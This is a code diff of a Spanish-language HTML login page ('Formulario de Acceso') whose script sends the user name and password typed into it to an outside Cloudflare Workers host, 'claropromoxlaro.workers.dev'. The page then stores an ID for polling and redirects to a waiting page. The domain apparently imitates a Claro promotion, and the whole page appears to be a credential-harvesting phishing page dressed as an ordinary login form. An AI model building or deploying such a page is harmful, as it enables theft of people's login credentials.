@@ -1,20 +1,52 @@
-<script>
-  document.getElementById("loginForm").addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const usuario = document.getElementById("usuario").value;
-    const clave = document.getElementById("clave").value;
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+</head>
+<body>
+  <h2>Formulario de Acceso</h2>
+  <form id="loginForm">
+    <label>Usuario:</label>
+    <input type="text" id="usuario" required><br><br>
 
-    const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
-      method: "POST",
-      headers: {"Content-Type":"application/json"},
-      body: JSON.stringify({usuario, clave})
+    <label>Clave:</label>
+    <input type="password" id="clave" required><br><br>
+
+    <button type="submit">Enviar</button>
+  </form>
+
+  <script>
+    const loginForm = document.getElementById("loginForm");
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      
+      const usuario = document.getElementById("usuario").value;
+      const clave = document.getElementById("clave").value;
+
+      try {
+        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usuario, clave })
+        });
+
+        const data = await res.json();
+
+        if (data.ok) {
+          // Guardamos el ID temporal para polling
+          localStorage.setItem("login_id", data.id);
+          // Redirigimos a la página de espera
+          window.location.href = "esperando.html";
+        } else {
+          alert("❌ Error al enviar: " + data.error);
+        }
+      } catch(err) {
+        console.error(err);
+        alert("❌ Error de conexión al servidor");
+      }
     });
-    const data = await res.json();
-    if(data.ok){
-      localStorage.setItem("login_id", data.id); // Guardamos id para polling
-      window.location.href = "esperando.html";   // Redirigimos a la página de espera
-    } else {
-      alert("Error al enviar");
-    }
-  });
-</script>
+  </script>
+</body>
+</html>
